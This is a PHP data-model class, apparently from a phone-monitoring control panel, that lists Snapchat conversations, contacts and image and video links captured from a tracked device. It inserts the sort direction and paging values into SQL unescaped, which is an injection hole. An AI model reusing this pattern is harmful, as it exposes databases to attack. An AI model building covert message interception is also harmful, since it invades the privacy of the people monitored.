<?php

namespace Models\Cp;

class Snapchat extends BaseModel
{

    public function getDataTableData($devId, $params = array())
    {
        $devId = $this->getDb()->quote($devId);

        $sort = '`timestamp` ASC';
        if (count($params['sortColumns'])) {
            $columns = ['`name`', 's.`content`', 's.`timestamp`'];

            $sort = '';
            foreach ($params['sortColumns'] as $column => $direction) {
                if (isset($columns[$column])) {
                    $sort .= " {$columns[$column]} {$direction}";
                }
            }
        }

        $timeFrom = $this->getDb()->quote($params['timeFrom']);
        $timeTo = $this->getDb()->quote($params['timeTo']);
        $account = $this->getDb()->quote($params['account']);

        $select = "SELECT s.`id`, s.`content`, s.`content_type`, s.`timestamp`, s.`user_id`, (SELECT `nickname` FROM `snapchat_users` WHERE `dev_id` = {$devId} AND `account_id` = {$account} AND `user_id` = s.`user_id` LIMIT 1) name";

        $fromWhere = "FROM (SELECT
                            `user_id`,
                            MAX(`timestamp`) as max_time
                        FROM `snapchat_messages`
                        WHERE
                            `dev_id` = {$devId} AND
                            `account_id` = {$account} AND
                            `timestamp` >= {$timeFrom} AND
                            `timestamp` <= {$timeTo}
                        GROUP BY `user_id`) last
                        INNER JOIN `snapchat_messages` s ON s.`dev_id` = {$devId} AND s.`account_id` = {$account} AND s.`user_id` = last.`user_id` AND last.`max_time` = s.`timestamp`";

        $query = "{$select} {$fromWhere}"
                . " ORDER BY {$sort} LIMIT {$params['start']}, {$params['length']}";

        $result = array(
            'aaData' => $this->getDb()->query($query)->fetchAll(\PDO::FETCH_ASSOC)
        );

        if (empty($result['aaData'])) {
            $result['iTotalRecords'] = 0;
            $result['iTotalDisplayRecords'] = 0;
        } else {
            $result['iTotalRecords'] = $this->getDb()->query("SELECT COUNT(*) FROM (SELECT s.`id` {$fromWhere}) a")->fetchColumn();
            $result['iTotalDisplayRecords'] = $result['iTotalRecords'];
        }

        return $result;
    }

    public function getAccountsList($devId)
    {
        $devId = $this->getDb()->quote($devId);

        $data = $this->getDb()->query("SELECT `account_id`, `nickname` FROM `snapchat_users` WHERE `dev_id` = {$devId} AND `account_id` = `user_id`")->fetchAll(\PDO::FETCH_KEY_PAIR);
        
        foreach ($data as $key => $value) {
            if (!strlen($value)) {
                $data[$key] = $key;
            }
        }
        
        return $data;
    }

    public function getMessagesList($devId, $account, $user)
    {
        $escapedDevId = $this->getDb()->quote($devId);
        $escapedAccount = $this->getDb()->quote($account);
        $escapedUser = $this->getDb()->quote($user);

        $messages = $this->getDb()->query("SELECT
                                            sm.`type`,
                                            su.`user_id`,
                                            su.`nickname` name,
                                            sm.`content`,
                                            sm.`content_type`,
                                            sm.`timestamp`
                                        FROM `snapchat_messages` sm
                                        INNER JOIN `snapchat_users` su ON su.`dev_id` = {$escapedDevId} AND su.`account_id` = {$escapedAccount} AND su.`user_id` = sm.`user_id`
                                        WHERE 
                                            sm.`dev_id` = {$escapedDevId} AND
                                            sm.`account_id` = {$escapedAccount} AND
                                            sm.`user_id` = {$escapedUser}
                                        ORDER BY `timestamp` DESC")->fetchAll();
                                            
        foreach ($messages as $key => $value) {
            if ($value['content_type'] == 'image') {
                $messages[$key]['image'] = $this->getImageUrl($devId, $account, $value['content']);
                $messages[$key]['preview'] = $this->getPreviewUrl($devId, $account, $value['content']);
            } elseif ($value['content_type'] == 'video') {
                $messages[$key]['preview'] = $this->getPreviewUrl($devId, $account, $value['content']);
                $messages[$key]['video'] = $this->getVideoUrl($devId, $account, $value['content']);
            }
        }

        return $messages;
    }

    private function getImageUrl($devId, $account, $filename)
    {
        return $this->getCDNAuthorizedUrl(urlencode($devId) . '/snapchat/' . urlencode($account) . '/image/' . urlencode($filename) . '.jpg');
    }
    
    private function getPreviewUrl($devId, $account, $filename)
    {
        return $this->getCDNAuthorizedUrl(urlencode($devId) . '/snapchat/' . urlencode($account) . '/preview/' . urlencode($filename) . '.jpg');
    }
    
    private function getVideoUrl($devId, $account, $filename)
    {
        return $this->getCDNAuthorizedUrl(urlencode($devId) . '/snapchat/' . urlencode($account) . '/video/' . urlencode($filename) . '.mp4');
    }

    public function getUserName($devId, $account, $userId)
    {
        $devId = $this->getDb()->quote($devId);
        $account = $this->getDb()->quote($account);
        $userId = $this->getDb()->quote($userId);

        $data = $this->getDb()->query("SELECT `nickname`, `user_id` FROM `snapchat_users` WHERE `dev_id` = {$devId} AND `account_id` = {$account} AND `user_id` = {$userId} LIMIT 1")->fetch();
        
        if ($data === false) {
            return false;
        }
        
        if (strlen($data['nickname'])) {
            return $data['nickname'];
        }
        
        return $data['user_id'];
    }

    public function getGroupUsers($devId, $account, $groupId)
    {
        $devId = $this->getDb()->quote($devId);
        $account = $this->getDb()->quote($account);
        $groupId = $this->getDb()->quote($groupId);

        return $this->getDb()->query("SELECT 
                kgm.`user_id`,
                ku.`nickname`
            FROM `kik_group_members` kgm
            INNER JOIN `kik_users` ku ON ku.`dev_id` = {$devId} AND ku.`account_id` = {$account} AND ku.`user_id` = kgm.`user_id`
            WHERE 
                kgm.`dev_id` = {$devId} AND
                kgm.`account_id` = {$account} AND
                kgm.`group_id` = {$groupId}")->fetchAll(\PDO::FETCH_KEY_PAIR);
    }

}
